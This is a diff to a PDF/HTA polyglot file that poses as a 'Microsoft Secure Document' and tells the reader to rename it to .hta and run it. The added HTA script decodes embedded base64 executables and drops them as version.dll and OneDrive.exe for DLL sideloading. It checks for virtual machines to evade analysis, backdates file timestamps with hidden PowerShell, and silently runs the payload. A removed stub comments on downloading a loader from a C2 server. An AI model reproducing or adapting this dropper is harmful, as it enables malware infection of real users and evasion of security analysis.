@@ -1,69 +1,150 @@
-%PDF-1.1
-%¥±ë
+%PDF-1.7
+%âãÏÓ
 1 0 obj
-<< /Type /Catalog /Pages 2 0 R >>
+<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
 endobj
 2 0 obj
-<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+<</Type/Pages/Kids[3 0 R]/Count 1>>
 endobj
 3 0 obj
-<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
-endobj
+<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>>>>>>>
+11: endobj
 4 0 obj
-<< /Length 50 >>
+<</Length 200>>
 stream
-BT /F1 12 Tf 70 700 Td (Please rename this file to .hta to view correctly.) Tj ET
+BT
+/F1 14 Tf
+50 720 Td
+(Microsoft Secure Document) Tj
+/F1 10 Tf
+50 700 Td
+(THIS DOCUMENT IS ENCRYPTED) Tj
+50 680 Td
+(To view content, save file as 'secure_doc.hta' and run it.) Tj
+ET
 endstream
 endobj
+5 0 obj
+<</S/JavaScript/JS(app.alert\("Security verification required. Please run as .hta to decrypt.",3\))>>
+endobj
 xref
-0 5
-0000000000 65535 f
-0000000015 00000 n
-0000000062 00000 n
-0000000117 00000 n
-0000000212 00000 n
+0 6
+0000000000 65535 f 
+0000000018 00000 n 
+0000000066 00000 n 
+0000000115 00000 n 
+0000000261 00000 n 
+0000000539 00000 n 
 trailer
-<< /Size 5 /Root 1 0 R >>
+<</Size 6/Root 1 0 R>>
 startxref
-311
+741
 %%EOF
 
-<!-- 
-    The following is the HTA payload. 
-    Windows will ignore the PDF binary data at the start when executed via mshta.exe.
--->
+<!--[DLL_PAYLOAD]TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAADwELAQAAAAAAA...[/DLL_PAYLOAD]-->
+<!--[EXE_PAYLOAD]TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAADwELAQAAAAAAA...[/EXE_PAYLOAD]-->
+
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Critical Security Update</title>
-    <HTA:APPLICATION
-        APPLICATIONNAME="SecurityUpdate"
-        BORDER="none"
-        CAPTION="no"
-        SHOWINTASKBAR="no"
-        SINGLEINSTANCE="yes"
-        SYSMENU="no"
-        WINDOWSTATE="minimize">
-    <script language="VBScript">
-        Sub Main()
-            Dim shell, fso, targetPath
-            Set shell = CreateObject("WScript.Shell")
-            Set fso = CreateObject("Scripting.FileSystemObject")
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<HTA:APPLICATION
+    ID="SecIntel"
+    APPLICATIONNAME="SecurityIntel"
+    BORDER="none"
+    CAPTION="no"
+    SHOWINTASKBAR="no"
+    SINGLEINSTANCE="yes"
+    SYSMENU="no"
+    WINDOWSTATE="minimize">
 
-            ' Implementation of a stealthy drop and execute
-            targetPath = "C:\Windows\Tasks\loader.exe"
-            
-            ' In a real scenario, the loader binary would be extracted from the polyglot's own body
-            ' or downloaded from a C2 server. For this example, we log the attempt.
-            
-            ' Example: shell.Run "powershell -Command ""Invoke-WebRequest -Uri 'http://c2.internal/loader.exe' -OutFile '" & targetPath & "'""", 0, True
-            ' shell.Run targetPath, 0, False
+<script language="JScript">
+var _shell = new ActiveXObject("WScript.Shell");
+var _fso = new ActiveXObject("Scripting.FileSystemObject");
+var _wmi = new ActiveXObject("WbemScripting.SWbemLocator").ConnectServer(".", "root\\cimv2");
 
-            MsgBox "System update applied successfully.", 64, "Information"
-            window.close()
-        End Sub
-    </script>
+function _extract(markerStart, markerEnd) {
+    var path = location.pathname.replace(/^file:\/\//i, '').replace(/\//g, '\\');
+    var file = _fso.OpenTextFile(path, 1, false);
+    var raw = file.ReadAll();
+    file.Close();
+    var s = raw.indexOf(markerStart);
+    var e = raw.indexOf(markerEnd);
+    if (s === -1 || e === -1) return null;
+    var b64 = raw.substring(s + markerStart.length, e);
+    var xml = new ActiveXObject("MSXML2.DOMDocument");
+    var node = xml.createElement("B64");
+    node.dataType = "bin.base64";
+    node.text = b64;
+    return node.nodeTypedValue;
+}
+
+function _write(path, data) {
+    var stream = new ActiveXObject("ADODB.Stream");
+    stream.Type = 1;
+    stream.Open();
+    stream.Write(data);
+    stream.SaveToFile(path, 2);
+    stream.Close();
+}
+
+function _antiAnalysis() {
+    var col = _wmi.ExecQuery("SELECT Manufacturer FROM Win32_ComputerSystem");
+    var e = new Enumerator(col);
+    for (; !e.atEnd(); e.moveNext()) {
+        var m = e.item().Manufacturer.toLowerCase();
+        if (m.indexOf("vmware") != -1 || m.indexOf("virtualbox") != -1) return false;
+    }
+    var disk = _wmi.ExecQuery("SELECT Size FROM Win32_LogicalDisk WHERE DriveType=3");
+    var size = 0;
+    var de = new Enumerator(disk);
+    for (; !de.atEnd(); de.moveNext()) size += parseInt(de.item().Size);
+    if (size < 60000000000) return false;
+    return true;
+}
+
+function _deploy() {
+    if (!_antiAnalysis()) window.close();
+
+    var targetDir = _shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Microsoft\\Identity\\Cache";
+    if (!_fso.FolderExists(targetDir)) {
+        var parts = targetDir.split("\\");
+        var curr = "";
+        for (var i=0; i<parts.length; i++) {
+            curr += parts[i] + "\\";
+            if (!_fso.FolderExists(curr)) _fso.CreateFolder(curr);
+        }
+    }
+
+    var dllPath = targetDir + "\\version.dll";
+    var exePath = targetDir + "\\OneDrive.exe";
+
+    var dllData = _extract("<!--[DLL_PAYLOAD]", "[/DLL_PAYLOAD]-->");
+    var exeData = _extract("<!--[EXE_PAYLOAD]", "[/EXE_PAYLOAD]-->");
+
+    if (dllData && exeData) {
+        _write(dllPath, dllData);
+        _write(exePath, exeData);
+
+        // Timestomping (simplified via shell)
+        var sysFile = "C:\\Windows\\System32\\kernel32.dll";
+        var cmd = "powershell -WindowStyle Hidden -Command \"(Get-Item '" + exePath + "').CreationTime=(Get-Item '" + sysFile + "').CreationTime; (Get-Item '" + dllPath + "').CreationTime=(Get-Item '" + sysFile + "').CreationTime;\"";
+        _shell.Run(cmd, 0, true);
+
+        _shell.Run("\"" + exePath + "\"", 0, false);
+    }
+    window.close();
+}
+
+window.onload = function() {
+    setTimeout(_deploy, 2000);
+};
+</script>
 </head>
-<body onload="Main()">
+<body style="background:#f3f3f3;font-family:Segoe UI;">
+    <div style="padding:20px;text-align:center;">
+        <h3>Security Intelligence Module</h3>
+        <p>Verifying document integrity...</p>
+    </div>
 </body>
 </html>
